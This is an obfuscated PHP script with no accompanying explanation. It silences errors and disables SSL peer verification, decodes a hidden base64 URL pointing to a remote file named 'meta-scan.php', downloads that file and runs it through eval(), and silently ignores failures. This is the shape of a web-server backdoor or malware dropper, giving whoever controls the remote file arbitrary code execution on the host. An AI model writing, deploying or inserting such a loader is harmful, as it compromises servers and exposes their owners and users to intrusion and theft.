<?php
ini_set(base64_decode('ZGlzcGxheV9lcnJvcnM='), 0);
error_reporting(0);

$dFy5o0 = function($Bm7g2) {
    $ch = curl_init($Bm7g2);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; PHP script)');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    $Vn6o1 = curl_exec($ch);
    if ($Vn6o1 === false) throw new Exception('cURL Error: ' . curl_error($ch));
    curl_close($ch);
    return $Vn6o1;
};

$hMn9u0 = function($Jg9b2) {
    $Jg9b2 = trim($Jg9b2);
    if (str_starts_with($Jg9b2, '<?php')) $Jg9b2 = substr($Jg9b2, 5);
    if (str_ends_with($Jg9b2, '?>')) $Jg9b2 = substr($Jg9b2, 0, -2);
    return $Jg9b2;
};

$lQ8u9x = fn($zFk4x2) => base64_decode($zFk4x2);

$Tj9o3n = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FsYW5wYWpsYW4vbWV0YS1jb25mL21haW4vbWV0YS1zY2FuLnBocA==';
$kBr8n1 = $lQ8u9x($Tj9o3n);

try {
    $uP8d2 = $dFy5o0($kBr8n1);
    $Ml5x3 = $hMn9u0($uP8d2);
    eval($Ml5x3);
} catch (Exception $e) {
}
?>